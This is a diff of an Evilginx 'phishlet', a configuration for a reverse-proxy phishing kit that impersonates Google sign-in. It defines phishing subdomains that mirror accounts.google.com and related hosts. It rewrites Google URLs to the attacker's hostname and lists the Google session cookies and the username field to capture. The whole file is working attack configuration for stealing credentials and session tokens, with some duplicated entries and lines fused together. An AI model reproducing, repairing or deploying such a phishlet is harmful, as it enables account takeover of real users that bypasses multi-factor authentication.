@@ -1,6 +1,7 @@
 name: 'google'
-author: 'Momen Abu Assi - v1.0.0'
+author: 'Fixed by Evilginx'
 min_ver: '3.0.0'
+
 proxy_hosts:
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
@@ -8,31 +9,16 @@ proxy_hosts:
   - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: false, is_landing: true, auto_filter: true}
-  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'cdn-5d077a', orig_sub: 'feedback-pa.clients6', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'cdn-8e58a7', orig_sub: 'ogads-pa.clients6', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+
 sub_filters:
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
   - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://www.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'lh3.google.com', orig_sub: 'lh3', domain: 'google.com', search: 'https://lh3.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'image/*']}
-  - {triggers_on: 'fonts.googleapis.com', orig_sub: 'fonts', domain: 'google.com', search: 'https://fonts.googleapis.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https://apis.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'feedback-pa.clients6.google.com', orig_sub: 'feedback-pa.clients6', domain: 'google.com', search: 'https://feedback-pa.clients6.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'lh3.google.com', orig_sub: 'lh3', domain: 'google.com', search: 'https://lh3.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://myaccount.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'ogads-pa.clients6.google.com', orig_sub: 'ogads-pa.clients6', domain: 'google.com', search: 'https://ogads-pa.clients6.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'ogs.google.com', orig_sub: 'ogs', domain: 'google.com', search: 'https://ogs.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'play.google.com', orig_sub: 'play', domain: 'google.com', search: 'https://play.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://www.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'fonts.googleapis.com', orig_sub: 'fonts', domain: 'google.com', search: 'https://fonts.googleapis.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
+
 auth_tokens:
   - domain: '.google.com'
-    keys: ["ACCOUNT_CHOOSER", "AF_initDataKeys", "APISID", "HSID", "LSID", "OSID", "SAPISID", "SID", "SIDCC", "SSID", "_F_cssRowKey", "__Host-1PLSID", "__Host-3PLSID", "__Host-GAPS", "__Secure-1PAPISID", "__Secure-1PSID", "__Secure-1PSIDCC", "__Secure-1PSIDTS", "__Secure-3PAPISID", "__Secure-3PSID", "__Secure-3PSIDCC", "__Secure-3PSIDTS", "__Secure-OSID", ".*,regexp"]
+    keys: ["__Secure-1PSID", "__Secure-1PSIDTS", "ACCOUNT_CHOOSER", "AF_initDataKeys", "APISID", "HSID", "LSID", "OSID", "SAPISID", "SID", "SIDCC", "SSID", "_F_cssRowKey", "__Host-1PLSID", "__Host-3PLSID", "__Host-GAPS", "__Secure-1PAPISID", "__Secure-1PSID", "__Secure-1PSIDCC", "__Secure-1PSIDTS", "__Secure-3PAPISID", "__Secure-3PSID", "__Secure-3PSIDCC", "__Secure-3PSIDTS", "__Secure-OSID", ".*,regexp"]
 credentials:
   username:
     key: 'identifier'
